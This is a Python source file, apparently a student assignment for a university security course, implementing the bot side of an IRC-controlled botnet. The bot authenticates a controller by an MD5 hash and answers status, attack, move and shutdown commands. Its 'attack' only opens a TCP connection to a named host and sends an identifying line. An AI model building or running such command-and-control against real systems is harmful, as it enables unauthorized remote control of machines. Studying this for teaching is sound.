'''
Last Name:          Champagne
First Name:         Steven
Course:             CPSC526
Assignment:         6: IRC Controller/Bot
Tutorial:           T03
Date:               2017-12-3
Files Submitted:    conbot.py, bot.py, readme.pdf

python version: 3.6.2

ARGS PROTOTYPE: bot.py <hostname> <port> <channel> <secret-phrase>

HOW TO RUN (EXAMPLE): $ python3 bot.py 162.246.156.17 12399 cpsc526 SECRET


'''

import argparse
import random
import string
import socket
import sys
import select
import hashlib
import time

#parsing the args
parser = argparse.ArgumentParser(description="IRC BOT.")
parser.add_argument("-d", "--debug", action="store_true", required=False, help="Activates using the default values & server provided for testing.")
parser.add_argument("hostname", type=str, help="IP or Host Name of IRC server.")
parser.add_argument("port", type=int, help="Port of host machine.")
parser.add_argument("channel", type=str, help="Channel of IRC server to connect to (without # included).")
parser.add_argument("secret_phrase", metavar='secret-phrase', type=str, help="Secret Phrase to control bots")
args = parser.parse_args()

if args.debug:
    print("DEBUG MODE")
    args.hostname = "162.246.156.17"
    args.port = 12399
    args.channel = "cpsc526"
    args.secret_phrase = "SECRET"

#globals
HOST = args.hostname
PORT = args.port #int, not string.
CHANNEL = '' #includes HASHTAG
SECRET = args.secret_phrase
NICK = ''
CONTROL_KEY = ''
IRC_CONN = None
CONTROL_BOT = ''
ATTACK_NUMBER = ''
ATTACK_ORDERS = ''

def createNick():
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(12))

#connect to IRC server.
def connect():
    global NICK, IRC_CONN, CHANNEL

    while True:
        nick = createNick()

        # connect to IRC
        irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        irc.settimeout(5.0)
        irc.connect((args.hostname, args.port))#need try catch around this
        irc.send(("NICK "+nick+"\n").encode())
        irc.send(("USER " + nick + ' * * : ' +nick+"\n").encode())

        # print results
        nickResponse = irc.recv(1024).decode("UTF-8")
        #print(nickResponse)#del
        if nickResponse.split()[1] == "433":
            #keep trying nicks with 5 second delay.
            try:
                time.sleep(5)
            except KeyboardInterrupt:
                pass #dont need to do anything cause not connected if here.
            continue
        elif nickResponse.split()[1] == "001":
            print("--> NICK:   ",nick)
            print("--> NICK AND USER ACCEPTED!")
            break

    # now join the channel
    channel = '#'+args.channel
    irc.send(('JOIN :' + channel + '\n').encode())
    joinChannelResponse = irc.recv(1024).decode("UTF-8")
    print("--> JOINED CHANNEL: " + channel)
    #print(joinChannelResponse)#del

    #now save the result
    CHANNEL=channel
    NICK=nick
    IRC_CONN=irc
    return

#if recieved the move command check message args, try to move...
#   if can move replace globals
#   if can't move report failure.
#   Attempt to rejoin if failed... maybe...
def move(message):
    global IRC_CONN, CHANNEL, HOST, PORT, NICK
    sendOnce = True


    m = message.split(":")[2] #gets only the :message part
    #print("BOT MOVE: " +m)

    m = m.split() #splits into <move> <host> <port> <channel> array

    try:
        host = m[1]
        port = int(m[2])
        channel = '#' + m[3]


        if HOST == host and PORT == port:
            if CHANNEL == channel:
                #return sucess message (already done)
                sendMessageToUser("switch successful*")

            else:
                IRC_CONN.send(("JOIN " + channel + "\n").encode())
                sendMessageToUser("switch successful*")
                IRC_CONN.send(("PART " + CHANNEL + "\n").encode()) #leaves the channel
                CHANNEL = channel
        else:
            # try later. will be moving to different server/port
            # send QUIT
            # rejoin (send NICK & JOIN messages)
            #   if success then send success to old IRC socket (to CONTROL_BOT)
            #       save new host, port, socket, channel, to globals.
            #   if fail then do not change globals and send failure (once).
            #       Possibly attempt to reconnect after 5 seconds.
            pass

    except:
        #if inputs are not successful, Do not attempt to switch.
        if sendOnce == True:
            sendOnce = False
            sendMessageToUser("switch failed*")
        # time.sleep(5)
        # move(message)

    return



#sends a message to the irc channel of the form:
# PRIVMSG #channel :<message>
def sendMessageToChannel(message):
    global IRC_CONN
    ircMessage = "PRIVMSG " + CHANNEL + " :" + message + "\n"
    IRC_CONN.sendall(ircMessage.encode())
    return

def sendMessageToUser(message):
    global IRC_CONN, CONTROL_BOT
    if CONTROL_BOT == '':
        print("--> UNKNOWN CONTROLLER")
    ircMessage = "PRIVMSG " + CONTROL_BOT + " :" + message + "\n"
    IRC_CONN.sendall(ircMessage.encode())
    return

#disconnect from a specific IRC server socket.
def disconnect(soc):
    soc.close()

# an IRC user sends "identify <md5 hash>" and we check if the has is "username+secret-phrase" hashed
# saves hex md5 digest to global variable
# keySent must be a hex md5 digest string
def checkControlKey(sentByName, keySent):
    global SECRET, CONTROL_BOT, CONTROL_KEY

    #combine nick and secret in string
    nick_secret = sentByName + SECRET

    # hash it
    m = hashlib.md5()
    m.update(nick_secret.encode())
    conkey = m.hexdigest()

    if (conkey == keySent):
        #print("CONKEY == SENTKEY")
        #save results
        CONTROL_KEY=conkey
        CONTROL_BOT=sentByName
    else:
        print("--> INVALID KEY")
        pass
    return

def printHelp():
    #this is essentially just for debugging.
    print("--> WELCOME TO HELP CENTER!!")
    return

#returns "attack successful*" to irc controlbot if Successful
#returns "attack failed*" to irc controlbot if attack failed.
def attacking(message, number):
    global NICK
    # get host and port from message

    #print ("ATTACK MESSAGE: " + message)

    m = message.strip().split(":")[2].split()
    print(m)#del

    host = m[1]
    port = m[2]

    #try to attack target
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.settimeout(2)
    try:
        port = int(port)
        soc.connect((host, port))
        attackString = "BOT " + NICK + " IS " + number +"\n"
        soc.sendall(attackString.encode())
    except:
        # if failed send fail to control bot and returns
        sendMessageToUser("attk failed*")
        return

    soc.close()

    #report success
    sendMessageToUser("attk successful*")
    return



def select_handle():
    global IRC_CONN, NICK, CONTROL_BOT, ATTACK_ORDERS

    while True:
        try:
            #NOTE: might need to set socket to non-blocking
            readable, writeable, exceptable = select.select([IRC_CONN,sys.stdin],[sys.stdout],[])
        except KeyboardInterrupt:
            disconnect(IRC_CONN)
            sys.exit()
        except ValueError:
            disconnect(IRC_CONN)
            sys.exit()

        for _ in readable:
            #if from stdin
            if _ == sys.stdin:
                message = sys.stdin.readline()
                command = message.split()

                if command[0] == "help":
                    print("--> COMMAND=HELP")
                    printHelp()
                elif command[0] == "quit":
                    print("--> COMMAND=QUIT")
                    disconnect(IRC_CONN)
                    break
                else:
                    sendMessageToChannel(message)

            #if from irc
            if _ == IRC_CONN:
                message = IRC_CONN.recv(1024).decode("UTF-8")
                #print(message)
                splitColon = message.split(":")
                #print(splitColon)
                userName = splitColon[1].split("!")[0]
                #print("USERNAME:" + userName)#del


                # return ping
                if splitColon[0] == "PING ":
                    pong = "PONG :"+splitColon[1]+"\n"
                    #print(pong)
                    IRC_CONN.send(pong.encode())

                if "identify" in message:
                    #respond to identify
                    print("RECIEVED IDENTIFY REQUEST")#del

                    hashkey = message.strip().split()[4]
                    #print("HASHKEY: " + hashkey)#del

                    checkControlKey(userName, hashkey)
                    #print(CONTROL_BOT)


                # if messages are from the control bot...
                if userName == CONTROL_BOT: #need to check if this works...

                    if "status" in message:
                        #respond to status
                        print("RECIEVED STATUS REQUEST")#del
                        sendMessageToUser("reporting*")
                    elif "attack" in message:
                        #respond to attack
                        print("RECIEVED ATTACK REQUEST")#del
                        requestAttackCounter()
                        ATTACK_ORDERS = message

                    elif "proceede" in message:
                        number = decodeAttackNumber(message)
                        attacking(ATTACK_ORDERS, number)

                    elif "move" in message:
                        #is is a response to MOVE
                        print("RECIEVED MOVE REQUEST")#del
                        move(message)

                    elif "shutdown" in message:
                        #respond to shutdown
                        print("RECIEVED SHUTDOWN REQUEST")#del
                        shuttingDown()
    return




def decodeAttackNumber(message):
    m = message.split(":")[2].split()[1]
    #print("PROCEED ORDER: "+m)
    return m

def requestAttackCounter():
    global ATTACK_NUMBER
    sendMessageToUser("request counter*")
    return


def shuttingDown():
    global IRC_CONN
    sendMessageToUser("shutting down*")
    sys.exit()
    return


def Main():
    #connect
    connect()

    #select handle inputs and outputs
    select_handle()






if __name__ == '__main__':
    Main()
